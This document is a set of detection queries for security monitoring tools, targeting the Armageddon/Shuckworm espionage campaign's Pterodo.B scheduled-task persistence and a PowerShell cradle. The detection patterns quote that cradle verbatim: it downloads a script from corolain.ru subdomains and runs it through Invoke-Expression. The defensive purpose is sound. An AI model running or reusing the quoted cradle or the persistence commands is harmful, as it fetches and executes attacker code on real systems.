# Armageddon/Shuckworm group Espionage campaign
### Detect scheduled tasks created by variant Backdoor.Pterodo.B to establish persistence.
#### Microsoft Windows

```text
rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "UDPSync" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "hailJPT" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "SyncPlayer" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "enormouslyAKeIXNE" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "UDPSync" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "hailJPT" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "SyncPlayer" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "enormouslyAKeIXNE" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "UDPSync" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "hailJPT" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "SyncPlayer" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "enormouslyAKeIXNE" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
### Detects leveraging powershell to download a powershell script from corolain[.]ru subdomains.
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" AND baseeventid = 4104 and message contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp""
```
### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and (resourcecustomfield1 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"" OR resourcecustomfield2 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"")
```
### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (resourcecustomfield1 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"" OR resourcecustomfield2 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"")
```
### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (resourcecustomfield1 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"" OR resourcecustomfield2 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"")
```
